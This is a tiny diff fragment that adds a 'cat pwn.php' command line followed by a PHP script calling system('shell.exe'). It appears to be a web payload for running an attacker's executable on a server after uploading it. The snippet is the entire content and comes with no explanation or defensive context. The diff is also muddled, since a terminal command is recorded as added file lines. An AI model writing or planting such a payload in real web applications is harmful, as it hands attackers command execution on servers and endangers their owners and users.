@@ -1,0 +1,4 @@
+cat pwn.php 
+<?php
+$exec = system('shell.exe', $val);
+?>
